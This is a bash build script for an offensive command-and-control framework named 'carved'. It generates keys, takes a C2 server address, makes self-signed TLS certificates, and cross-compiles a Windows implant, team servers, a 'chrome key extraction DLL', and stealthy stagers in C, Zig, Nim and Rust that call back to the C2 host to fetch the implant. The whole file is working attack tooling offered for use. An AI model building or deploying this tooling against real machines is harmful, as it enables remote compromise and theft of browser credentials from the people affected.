#!/bin/bash
set -e

echo "[*] building carved C2 framework..."

mkdir -p build/payloads

ENCRYPTION_KEY=$(openssl rand -hex 32)
echo "[*] generated encryption key: ${ENCRYPTION_KEY}"

DOWNLOAD_KEY=$(openssl rand -hex 16)
echo "[*] generated download key: ${DOWNLOAD_KEY}"

CHROME_PIPE_NAME="\\\\.\\pipe\\$(openssl rand -hex 8)"
echo "[*] generated chrome pipe name: ${CHROME_PIPE_NAME}"

echo ""
echo "[*] configuring C2 server connection..."
read -p "    Enter C2 server IP [127.0.0.1]: " STAGER_HOST
STAGER_HOST="${STAGER_HOST:-127.0.0.1}"

read -p "    Enter C2 listener port (only change if u want) [8443]: " STAGER_PORT
STAGER_PORT="${STAGER_PORT:-8443}"

read -p "    Enable TLS? [Y/n]: " ENABLE_TLS
ENABLE_TLS="${ENABLE_TLS:-y}"

USE_TLS=true
if [[ "$ENABLE_TLS" =~ ^[Nn]$ ]]; then
    USE_TLS=false
    SERVER_URL="http://${STAGER_HOST}:${STAGER_PORT}/"
else
    SERVER_URL="https://${STAGER_HOST}:${STAGER_PORT}/"
    if [[ "$STAGER_HOST" == "127.0.0.1" || "$STAGER_HOST" == "localhost" ]]; then
        echo "[*] generating self-signed TLS certificates (localhost)..."
    else
        echo "[*] public IP detected: ${STAGER_HOST}"
        echo "[!] generating self-signed TLS certificates..."
        echo "    NOTE: You will see security warnings in browsers/tools because this is self-signed."
    fi

    MSYS_NO_PATHCONV=1 openssl req -x509 -newkey rsa:2048 -keyout build/server.key -out build/server.crt \
        -days 365 -nodes -subj "/CN=${STAGER_HOST}"
    echo "[+] TLS configuration complete"
fi
echo "[*] implant will connect to: ${SERVER_URL}"
echo ""

echo "[*] building gobound.dll..."
cd gobound/dll
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildvcs=false -buildmode=c-shared -ldflags="-s -w -X main.pipeName=${CHROME_PIPE_NAME}" -trimpath -o ../../build/payloads/gobound.dll
cd ../..

echo "[*] building server..."
cd server/cmd
GOOS=darwin GOARCH=amd64 go build -buildvcs=false -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X main.DownloadKey=${DOWNLOAD_KEY}" -trimpath -o ../../build/server_mac
GOOS=linux GOARCH=amd64 go build -buildvcs=false -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X main.DownloadKey=${DOWNLOAD_KEY}" -trimpath -o ../../build/server
GOOS=windows GOARCH=amd64 go build -buildvcs=false -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X main.DownloadKey=${DOWNLOAD_KEY}" -trimpath -o ../../build/server.exe
cd ../..


echo "[*] generating random user agent..."
pushd utils/genua > /dev/null
go get .
USER_AGENT=$(go run .)
popd > /dev/null
echo "    Generated User Agent: ${USER_AGENT}"

echo "[*] building implant..."
cd implant/cmd
GOOS=windows GOARCH=amd64 go build -buildvcs=false -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X \"main.UserAgent=${USER_AGENT}\" -X main.ServerURL=${SERVER_URL} -X \"github.com/carved4/carved/implant/pkg/modules/chrome.pipeName=${CHROME_PIPE_NAME}\"" -trimpath -o ../../build/implant.exe
cd ../..
cp build/implant.exe build/payloads/implant.exe
echo "[*] building stagers..."
cd stager
echo "    [C] building stager_c.exe..."
sed "s/HOST_PLACEHOLDER/$STAGER_HOST/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g; s/DOWNLOAD_KEY_PLACEHOLDER/$DOWNLOAD_KEY/g" stager.c > stager_build.c
TLS_FLAG=""
if [ "$USE_TLS" = true ]; then
    TLS_FLAG="-DUSE_TLS"
fi
x86_64-w64-mingw32-gcc stager_build.c -o ../build/stager_c.exe \
    $TLS_FLAG \
    -Os \
    -s \
    -fno-ident \
    -ffunction-sections \
    -fdata-sections \
    -Wl,--gc-sections \
    -lwinhttp \
    -lkernel32 \
    -mwindows
rm -f stager_build.c
echo "    [Zig] building stager_zig.exe..."
ZIG_HOST_ARRAY=""
for (( i=0; i<${#STAGER_HOST}; i++ )); do
    char="${STAGER_HOST:$i:1}"
    ZIG_HOST_ARRAY+="'$char', "
done
sed "s/HOST_PLACEHOLDER/${ZIG_HOST_ARRAY}0/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g; s/USE_TLS_PLACEHOLDER/$USE_TLS/g; s/DOWNLOAD_KEY_PLACEHOLDER/$DOWNLOAD_KEY/g" stager.zig > stager_build.zig
zig build --prefix ../build
mv ../build/bin/stager.exe ../build/stager_zig.exe
rm -rf ../build/bin
rm -f stager_build.zig
echo "    [Nim] building stager_nim.exe..."
sed "s/HOST_PLACEHOLDER/$STAGER_HOST/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g; s/USE_TLS_PLACEHOLDER/$USE_TLS/g; s/DOWNLOAD_KEY_PLACEHOLDER/$DOWNLOAD_KEY/g" stager.nim > stager_build.nim
nim c -d:mingw -d:release -d:strip --opt:size --app:gui --cpu:amd64 -o:../build/stager_nim.exe stager_build.nim 2>/dev/null
rm -f stager_build.nim
echo "    [Rust] building stager_rust.exe..."
RUST_HOST_ARRAY="["
for (( i=0; i<${#STAGER_HOST}; i++ )); do
    char="${STAGER_HOST:$i:1}"
    RUST_HOST_ARRAY+="b'$char' as u16, "
done
RUST_HOST_ARRAY+="0]"
sed "s/HOST_PLACEHOLDER/$RUST_HOST_ARRAY/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g; s/USE_TLS_PLACEHOLDER/$USE_TLS/g; s/DOWNLOAD_KEY_PLACEHOLDER/$DOWNLOAD_KEY/g" stager.rs > stager_build.rs
cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null
mv target/x86_64-pc-windows-gnu/release/stager.exe ../build/stager_rust.exe 2>/dev/null || true
rm -f stager_build.rs
rm -rf target
cd ..
echo ""
echo "[+] build complete!"
echo ""
echo "    Encryption key: ${ENCRYPTION_KEY}"
if [ "$USE_TLS" = true ]; then
    echo "    C2 server URL:  ${SERVER_URL} (HTTPS)"
else
    echo "    C2 server URL:  ${SERVER_URL} (HTTP)"
fi
echo ""
PROTOCOL="http"
if [ "$USE_TLS" = true ]; then
    PROTOCOL="https"
fi
echo "    build/server              - linux team server"
echo "    build/server_mac          - macos team server"
echo "    build/server.exe          - windows team server"
if [ "$USE_TLS" = true ]; then
    echo "    build/server.crt          - TLS certificate"
    echo "    build/server.key          - TLS private key"
fi
mv build/stager* build/payloads/
echo "    build/implant.exe         - windows implant (connects to ${SERVER_URL})"
echo "    build/payloads/stager_c.exe        - windows stager (C) connects to ${PROTOCOL}://${STAGER_HOST}:${STAGER_PORT}"
echo "    build/payloads/stager_zig.exe      - windows stager (Zig) connects to ${PROTOCOL}://${STAGER_HOST}:${STAGER_PORT}"
echo "    build/payloads/stager_nim.exe      - windows stager (Nim) connects to ${PROTOCOL}://${STAGER_HOST}:${STAGER_PORT}"
echo "    build/payloads/stager_rust.exe     - windows stager (Rust) connects to ${PROTOCOL}://${STAGER_HOST}:${STAGER_PORT}"
echo "    build/payloads/gobound.dll - chrome key extraction DLL"
echo "    build/payloads/implant.exe - implant served by stager endpoint"
echo ""
echo "    NOTE: Both server and implant are configured with the same encryption key."
echo "          Start server with: ./build/server -port 9000 -listener ${STAGER_PORT}"
